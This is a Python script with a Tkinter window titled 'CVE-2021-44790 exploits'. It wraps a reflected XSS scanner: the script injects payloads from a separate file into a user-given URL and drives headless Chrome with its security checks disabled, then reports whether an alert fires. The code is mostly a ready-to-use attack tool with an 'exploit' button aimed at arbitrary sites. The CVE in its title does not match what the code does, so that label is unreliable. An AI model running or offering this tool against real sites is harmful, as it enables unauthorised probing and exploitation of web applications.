#!/usr/bin/python
# -*- coding: utf-8 -*-
# importing all required libraries

from selenium import webdriver

from selenium.webdriver.support.ui import WebDriverWait

from selenium.webdriver.support import expected_conditions as EC

from selenium.common.exceptions import TimeoutException

import warnings
import argparse
import sys
import tkinter
from tkinter import *
import tkinter as tk
from tkinter.ttk import *
from time import strftime
from tkinter import ttk
def all_required():
    root = tkinter.Tk()
    root.title("CVE-2021-44790 exploits")
    root.geometry('800x600+0+0')
    def printInput():
        inp = inputtxt.get(1.0, "end-1c")
        lbl.config(text = "attack url : "+inp)
        target = inp
        scroll_y = Scrollbar(root, orient=VERTICAL)
        txtarea = Text(root, yscrollcommand=scroll_y.set, font=("times new roman", 15, "bold"), fg="#3206b8")
        scroll_y.pack(side=RIGHT, fill=Y)
        scroll_y.config(command=txtarea.yview)
        banner = \
    '''            
	 __   __ _____ _____                     _     
	 \ \ / // ____/ ____|                   | |    
	  \ V /| (___| (___   ___  __ _ _ __ ___| |__  
	   > <  \___ \\__ _ \ / _ \/ _` | '__/ __| '_ \ 
	  / . \ ____) |___) |  __/ (_| | | | (__| | | |
	 /_/ \_\_____/_____/ \___|\__,_|_|  \___|_| |_|
	-----------------------------------------------
 	   \033[33m A Comprehensive Reflected XSS Scanner\033[0m 
	-----------------------------------------------

	   DEVELOPED & OWNED BY : SATHYAPRAKASH SAHOO 

        '''

# Configuring options for Chrome WebDriver

        warnings.filterwarnings('ignore')

        options = webdriver.ChromeOptions()

        options.add_argument('--headless')

        options.add_argument('--disable-xss-auditor')

        options.add_argument('--disable-web-security')

        options.add_argument('--ignore-certificate-errors')

        options.add_argument('--no-sandbox')

        driver = webdriver.Chrome(executable_path='/usr/bin/chromedriver',chrome_options=options)

# Creating arguments for taking input

# Printing Banner
        txtarea.insert(END, banner)
        #print (banner)

# Checking if placeholder is assigned in the URL or not

        txtarea.insert(END, "[*] Starting XSSearch ...\n")
        txtarea.pack(fill=BOTH, expand=True)
        txtarea.configure(state ='disabled')
        #print ("[*] Starting XSSearch ...")

# Executing a loop for checking valid XSS payload in the given URL

        for payload in open('xss-injection.txt', 'r').readlines():

            url = target.replace('{xss}', payload)

            driver.get(url)

# Checking for a javascript pop-up

            try:

                WebDriverWait(driver, 1).until(EC.alert_is_present())

                alert = driver.switch_to.alert

                alert.accept()

              #  print ("\033[31m[+] XSS Triggered !\033[0m", payload)
                txtarea.insert(END, "\033[31m[+] XSS Triggered !\033[0m")
                txtarea.insert(END, payload)
            except TimeoutException:

                #print ("\033[36m[+] XSS not Triggered ! \033[0m", payload)
                txtarea.insert(END, "\033[36m[+] XSS not Triggered ! \033[0m")
                txtarea.insert(END, payload)

        driver.close()

    Hacher = Label(root, text="Enter url or domin https://www.example.com/ap/v?search=1 : ").pack()
    inputtxt = tk.Text(root,height = 1,width = 80)
    inputtxt.pack()
    printButton = tk.Button(root,text = "exploit", command = printInput)
    printButton.pack()
    lbl = tk.Label(root, text = "")
    lbl.pack()
    root.mainloop()
